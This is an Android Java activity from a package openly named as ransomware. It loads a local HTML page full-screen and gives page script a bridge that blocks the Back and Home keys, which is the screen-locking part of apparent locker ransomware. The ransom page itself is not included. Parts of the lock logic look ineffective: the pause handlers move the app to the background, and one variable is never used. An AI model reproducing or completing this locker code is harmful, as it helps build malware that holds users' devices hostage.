package com.rivan.ransomware;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.view.WindowManager;
import android.view.KeyEvent;

public class MainActivity extends Activity {
    private WebView webView;
    public static boolean backLocked = false;

    private class AndroidBridge {
        @JavascriptInterface
        public void lockBack() {
            runOnUiThread(() -> { backLocked = true; });
        }

        @JavascriptInterface
        public void unlockBack() {
            runOnUiThread(() -> { backLocked = false; });
        }

        @JavascriptInterface
        public void exitApp() {
            runOnUiThread(() -> {
                backLocked = false;
                webView.destroy();
                finish();
                System.exit(0);
            });
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        webView = new WebView(this);
        setContentView(webView);
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setAllowFileAccessFromFileURLs(true);
        s.setAllowUniversalAccessFromFileURLs(true);
        webView.addJavascriptInterface(new AndroidBridge(), "Android");
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("file:///android_asset/index.html");
    }

    @Override
    public void onBackPressed() {
        if (backLocked) {
            webView.evaluateJavascript("history.pushState(null,'',location.href);", null);
            return;
        }
        super.onBackPressed();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (backLocked && (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME)) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (backLocked) {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            moveTaskToBack(false);
        }
    }

    @Override
    protected void onUserLeaveHint() {
        if (backLocked) {
            moveTaskToBack(false);
        }
    }
}
